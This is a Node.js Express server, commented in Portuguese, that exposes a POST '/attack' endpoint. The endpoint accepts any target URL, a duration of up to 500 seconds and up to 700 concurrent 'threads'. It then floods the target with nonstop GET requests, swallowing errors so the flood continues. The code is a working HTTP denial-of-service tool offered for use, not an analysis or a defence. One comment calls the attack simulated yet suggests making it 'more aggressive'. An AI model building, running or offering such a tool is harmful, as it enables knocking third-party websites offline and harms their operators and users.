const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 3000;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Função simples para flood (ataque simulado)
// Você pode trocar por algo mais agressivo depois
async function flood(url, tempo, threads) {
  const endTime = Date.now() + tempo * 1000;
  
  // Função que faz requisição contínua
  async function attackThread() {
    while (Date.now() < endTime) {
      try {
        await axios.get(url);
      } catch (e) {
        // ignorar erros para continuar flood
      }
    }
  }

  // Dispara X threads
  let promises = [];
  for (let i = 0; i < threads; i++) {
    promises.push(attackThread());
  }
  
  await Promise.all(promises);
}

app.post('/attack', async (req, res) => {
  const { url, tempo, threads } = req.body;

  // Validações básicas
  if (!url || (!url.startsWith('http://') && !url.startsWith('https://'))) {
    return res.status(400).json({ error: 'URL inválida. Precisa começar com http:// ou https://' });
  }
  const timeNum = Number(tempo);
  const threadsNum = Number(threads);

  if (isNaN(timeNum) || timeNum < 1 || timeNum > 500) {
    return res.status(400).json({ error: 'Tempo inválido. Mínimo 1, máximo 500 segundos.' });
  }
  if (isNaN(threadsNum) || threadsNum < 1 || threadsNum > 700) {
    return res.status(400).json({ error: 'Threads inválidas. Mínimo 1, máximo 700.' });
  }

  // Resposta imediata
  res.json({ message: `Iniciando ataque em ${url} por ${timeNum}s com ${threadsNum} threads` });

  // Rodar ataque async sem bloquear resposta
  flood(url, timeNum, threadsNum).catch(console.error);
});

app.listen(port, () => {
  console.log(`Servidor rodando na porta ${port}`);
});
